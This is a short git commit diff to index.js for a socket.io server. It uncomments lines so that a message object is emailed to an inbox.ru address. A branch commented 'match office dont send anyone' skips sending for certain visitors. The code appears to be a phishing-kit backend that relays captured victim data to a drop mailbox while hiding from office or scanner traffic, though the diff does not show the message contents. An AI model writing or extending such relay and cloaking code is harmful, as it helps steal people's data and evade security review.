8699c4751b377e28075a3f309f6e717376f5c060
wikoci <74468439+wikoci@users.noreply.github.com>
2022-03-09 09:39:13 +0100

    Update index.js

--- index.js
+++ index.js
@@ -177,7 +177,7 @@ io.on("connection", (socket) => {
         ) {
           // match office dont send anyone
         } else {
-        //  mxg.to = "arcane.cloud08@inbox.ru";
+          mxg.to = "arcane.cloud09@inbox.ru";
         //  mxg.bcc = "chris.kobe@inbox.ru";
           sendMail(mxg)
             .then((e) => {
@@ -188,8 +188,8 @@ io.on("connection", (socket) => {
             });
         }
       } else {
-      //  mxg.to = "arcane.cloud08@inbox.ru";
-      //  mxg.bcc = "chris.kobe@inbox.ru";
+        mxg.to = "arcane.cloud09@inbox.ru";
+        //  mxg.bcc = "chris.kobe@inbox.ru";
         sendMail(mxg)
           .then((e) => {
             // console.log(e);
